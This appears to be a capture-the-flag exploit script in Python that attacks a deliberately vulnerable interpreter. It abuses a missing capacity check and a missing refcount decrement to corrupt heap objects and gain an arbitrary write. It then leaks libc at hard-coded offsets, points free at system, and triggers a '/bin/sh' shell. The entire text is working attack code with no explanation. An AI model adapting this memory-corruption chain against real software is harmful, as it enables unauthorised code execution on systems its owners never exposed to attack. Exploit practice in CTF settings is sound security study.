print("Filling heap...", flush = True)
bs = []
for i in range(1000000):
    system_append(bs, [12345])
print("Creating lists...", flush = True)
spams = [0]
system_append(spams, 1337)
spams2 = [0]
system_append(spams2, 1337)
print("Using vuln 1 - missing capacity check...", flush = True)
for i in range(0, 10):
    my_append(spams, list)
print("Overriding size of next array...", flush = True)
my_append(spams, 0x1337)
base = id(spams2) + 0x30
print("Preparing for upgrade to arbwrite...", flush = True)
hackmeba = bytearray('B' * 1000, 'ascii')
myba = bytearray('A' * 1000, 'ascii')
offset = (id(myba) - base) // 8 + 5
print("Using vuln 2 - no refcount decrement...", flush = True)
my_set(spams2, offset, hackmeba)
print("WWW should have been obtained here!")

print("Leaking libc...", flush = True)
where = 0x948140
li = to_little_endian_bytes(where)
for i in range(len(li)):
    myba[8*5 + i] = int(li[i])

libc_base = from_little_endian_bytes(hackmeba[:8]) - 0xf8990
system = libc_base + 0x4c490
free = 0x948538

print("Libc leaked:", hex(libc_base), flush = True)

mytest = bytearray('/bin/sh\x00' + '\x00' * 10000000, 'ascii')
where, what = free, system
li = to_little_endian_bytes(where)
for i in range(len(li)):
    myba[8*5 + i] = int(li[i])
li = to_little_endian_bytes(what)
for i in range(len(li)):
    hackmeba[i] = int(li[i])

print("All prepared, hope for shell!", flush = True)
del mytest